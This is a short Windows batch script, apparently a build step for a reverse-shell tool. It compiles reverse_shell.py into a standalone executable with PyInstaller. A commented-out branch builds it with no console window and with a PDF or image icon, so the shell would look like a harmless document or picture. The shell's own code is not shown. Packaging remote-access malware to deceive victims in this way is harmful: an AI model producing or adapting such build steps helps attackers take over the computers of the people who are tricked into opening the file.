@echo off
git pull
rmdir /S /Q __pycache__
rmdir /S /Q build
rmdir /S /Q dist
del reverse_shell.spec
REM if %1==pdf (c:\Python38\Scripts\pyinstaller --onefile --noconsole --icon %cd%\Image\pdf.ico reverse_shell.py) else ( if %1==img (c:\Python38\Scripts\pyinstaller --onefile --noconsole --icon %cd%\Image\img.ico reverse_shell.py) else (c:\Python38\Scripts\pyinstaller --onefile reverse_shell.py))
c:\Python38\Scripts\pyinstaller --onefile reverse_shell.py
REM cd dist
REM reverse_shell.exe
REM cd ..